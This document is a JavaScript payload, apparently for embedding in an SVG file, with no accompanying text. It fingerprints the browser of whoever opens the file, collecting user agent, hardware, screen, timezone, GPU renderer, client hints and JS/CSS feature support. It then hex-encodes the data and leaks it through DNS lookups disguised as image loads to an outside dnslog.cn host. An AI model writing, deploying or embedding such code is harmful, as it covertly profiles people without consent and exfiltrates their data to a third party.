svg.script:
(function(){
 var D="zbas8n.dnslog.cn", SEQ=0;
 function hex(s){ var o=""; for(var i=0;i<s.length;i++){ var c=s.charCodeAt(i).toString(16); while(c.length<4) c="0"+c; o+=c; } return o; }
 function send(tag, data){
   var h = hex(data), i=0, n=0;
   while(i < h.length && n < 6){
     var chunk = h.substr(i, 48); i += 48;
     var img = new Image();
     img.src = "http://" + tag + n + "-" + chunk + ".p9." + D + "/" + n;
     n++;
   }
   if (h.length === 0){ var im=new Image(); im.src="http://"+tag+"e.p9."+D+"/e"; }
 }
 try{
  var feats = {
   hasOwn: typeof Object.hasOwn, at: typeof Array.prototype.at, sc: typeof structuredClone,
   uad: typeof navigator.userAgentData, wref: typeof WeakRef, fin: typeof FinalizationRegistry,
   off: typeof OffscreenCanvas, seg: typeof Intl.Segmenter, rep: typeof reportError,
   any: typeof Promise.any, gc: typeof globalThis,
   has: CSS.supports("selector(:has(a))"),
   cont: CSS.supports("container-type: inline-size"),
   subg: CSS.supports("grid-template-columns: subgrid"),
   nest: CSS.supports("selector(& a)"),
   ok: CSS.supports("color: oklch(0 0 0)"),
   tr: CSS.supports("transition-behavior: allow-discrete")
  };
  var gl = null, gpu = "";
  try{ var cv=document.createElement("canvas"); var g=cv.getContext("webgl")||cv.getContext("experimental-webgl");
       if(g){ var dbg=g.getExtension("WEBGL_debug_renderer_info"); gpu = dbg ? (g.getParameter(dbg.UNMASKED_RENDERER_WEBGL)+"|"+g.getParameter(dbg.UNMASKED_VENDOR_WEBGL)) : (g.getParameter(g.RENDERER)||""); }
  }catch(e){ gpu="glerr"; }
  var info = {
   ua: navigator.userAgent, pf: navigator.platform, l: navigator.language,
   hc: navigator.hardwareConcurrency, dm: navigator.deviceMemory||null,
   scr: screen.width+"x"+screen.height+"@"+window.devicePixelRatio,
   tz: (Intl.DateTimeFormat().resolvedOptions().timeZone||""),
   gpu: gpu, f: feats
  };
  if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues){
    navigator.userAgentData.getHighEntropyValues(["fullVersionList","platformVersion","uaFullVersion","architecture","model"]).then(function(v){
       try{ info.uach = v; }catch(e){}
       send("a", JSON.stringify(info));
    }).catch(function(){ send("a", JSON.stringify(info)); });
    setTimeout(function(){ try{ send("b", JSON.stringify({brands:navigator.userAgentData.brands, mob:navigator.userAgentData.mobile})); }catch(e){} }, 300);
  } else {
    send("a", JSON.stringify(info));
  }
 }catch(e){ send("z", String(e)); }
})();
